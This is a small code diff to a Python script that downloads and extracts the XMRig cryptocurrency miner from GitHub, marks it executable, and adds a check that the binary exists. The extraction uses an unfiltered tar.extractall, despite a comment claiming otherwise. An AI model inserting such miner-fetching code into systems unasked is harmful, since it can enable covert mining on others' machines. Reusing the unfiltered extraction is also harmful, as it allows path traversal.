@@ -19,7 +19,6 @@ TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0
 os.makedirs(XM_DIR, exist_ok=True)
 
 def download_xmrig():
-def download_xmrig():
     """Download and extract the miner binary."""
     tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
     try:
@@ -28,6 +27,12 @@ def download_xmrig():
         with tarfile.open(tar_path, "r:gz") as tar:
             # Extract all members while explicitly setting filter to None to avoid the warning
             tar.extractall(path=XM_DIR)
+        
+        # Debugging: Check if xmrig exists after extraction
+        if not os.path.exists(XM_BIN):
+            notify(f"❌ XMRig binary not found after extraction at {XM_BIN}")
+            return False
+        
         os.chmod(XM_BIN, 0o755)
         os.remove(tar_path)  # Clean up the tarball after extraction
         return True
